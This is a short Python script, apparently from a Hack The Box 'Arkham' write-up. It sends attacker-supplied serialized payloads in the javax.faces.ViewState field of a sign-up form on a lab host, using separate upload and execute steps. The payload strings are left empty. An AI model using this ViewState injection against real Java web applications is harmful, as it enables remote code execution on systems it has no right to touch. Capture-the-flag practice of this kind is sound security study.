#!/usr/bin/python3
import requests

# Write-up : https://0xrick.github.io/hack-the-box/arkham/

def exploit(payload):
	post_data = {"j_id_jsp_1623871077_1:email" : "test" , "j_id_jsp_1623871077_1:submit" : "SIGN UP" , "j_id_jsp_1623871077_1_SUBMIT" : "1" , "javax.faces.ViewState" : payload}
	requests.post("http://10.10.10.130:8080/userSubscribe.faces",data=post_data)

# put your own payloads

upload_payload = "" 
execute_payload	= ""

exploit(upload_payload)
exploit(execute_payload)